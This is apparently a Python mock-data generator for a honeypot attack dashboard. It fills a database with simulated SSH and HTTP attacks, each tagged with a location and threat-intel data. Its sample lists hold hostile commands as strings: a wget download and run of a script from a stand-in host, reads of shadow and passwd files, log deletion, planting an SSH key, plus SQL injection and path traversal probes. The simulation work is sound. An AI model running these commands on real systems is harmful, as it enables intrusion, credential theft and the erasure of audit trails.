import time
import random
import threading
import uuid
import hashlib
from faker import Faker
from core.database import Attack, get_db_session
from core.mitre_mapper import map_command_to_mitre
from core.threat_intel import ti_provider

fake = Faker()

# Sample malicious payloads for simulation, grouped into realistic "Sessions"
SSH_SESSIONS = [
    [
        "whoami",
        "cat /etc/passwd",
        "cat /etc/shadow"
    ],
    [
        "uname -a",
        "wget http://malicious.com/malware.sh -O /tmp/malware.sh",
        "chmod +x /tmp/malware.sh && /tmp/malware.sh",
        "rm -rf /var/log/auth.log"
    ],
    [
        "id",
        "echo 'ssh-rsa AAAAB3NzaC...' >> ~/.ssh/authorized_keys",
        "crontab -l"
    ]
]

HTTP_PAYLOADS = [
    "/wp-admin/login.php",
    "/phpmyadmin/",
    "/api/v1/users?id=1' OR 1=1--",
    "/../../../../etc/passwd",
    "/?cmd=id",
    "/admin.php"
]

# Random real-world locations for visual impact on the map
LOCATIONS = [
    {"country": "China", "lat": 35.8617, "lon": 104.1954},
    {"country": "Russia", "lat": 61.5240, "lon": 105.3188},
    {"country": "United States", "lat": 37.0902, "lon": -95.7129},
    {"country": "Brazil", "lat": -14.2350, "lon": -51.9253},
    {"country": "India", "lat": 20.5937, "lon": 78.9629},
    {"country": "Germany", "lat": 51.1657, "lon": 10.4515},
    {"country": "Iran", "lat": 32.4279, "lon": 53.6880},
    {"country": "North Korea", "lat": 40.3399, "lon": 127.5101}
]

def generate_mock_attack():
    session = get_db_session()
    
    source_ip = fake.ipv4()
    location = random.choice(LOCATIONS)
    
    # Get threat intel
    intel = ti_provider.get_ip_reputation(source_ip)
    
    # 70% SSH (multi-command sessions), 30% HTTP (single hit)
    is_ssh = random.random() < 0.7
    
    if is_ssh:
        session_id = str(uuid.uuid4())
        commands = random.choice(SSH_SESSIONS)
        
        for cmd in commands:
            file_hash = None
            if "wget" in cmd or "curl" in cmd:
                # Simulate a downloaded file hash
                file_hash = hashlib.sha256(str(random.random()).encode()).hexdigest()
                
            attack = Attack(
                session_id=session_id,
                source_ip=source_ip,
                geo_location=location["country"],
                latitude=location["lat"] + random.uniform(-2.0, 2.0),
                longitude=location["lon"] + random.uniform(-2.0, 2.0),
                port=22,
                protocol="SSH",
                payload=cmd,
                mitre_tags=map_command_to_mitre(cmd),
                risk_score=intel["risk_score"],
                threat_label=intel["threat_label"],
                file_hash=file_hash
            )
            session.add(attack)
            # Add a slight delay between commands in the same session for realism
            time.sleep(random.uniform(0.1, 0.5))
    else:
        # HTTP
        payload = random.choice(HTTP_PAYLOADS)
        attack = Attack(
            session_id=str(uuid.uuid4()),
            source_ip=source_ip,
            geo_location=location["country"],
            latitude=location["lat"] + random.uniform(-2.0, 2.0),
            longitude=location["lon"] + random.uniform(-2.0, 2.0),
            port=80,
            protocol="HTTP",
            payload=payload,
            mitre_tags=map_command_to_mitre(payload),
            risk_score=intel["risk_score"],
            threat_label=intel["threat_label"]
        )
        session.add(attack)
    
    session.commit()
    session.close()

def mock_generator_loop(delay_min=1, delay_max=5):
    """Run infinitely, generating an attack every random(delay_min, delay_max) seconds."""
    print(f"[*] Starting mock data generator. Injecting attacks every {delay_min}-{delay_max} seconds...")
    while True:
        generate_mock_attack()
        time.sleep(random.uniform(delay_min, delay_max))

def start_mock_generator_thread():
    thread = threading.Thread(target=mock_generator_loop, args=(2, 8), daemon=True)
    thread.start()
    return thread

if __name__ == "__main__":
    # If run directly, just insert 50 attacks quickly
    print("[*] Generating 50 bulk mock attacks...")
    for _ in range(50):
        generate_mock_attack()
    print("[+] Done.")
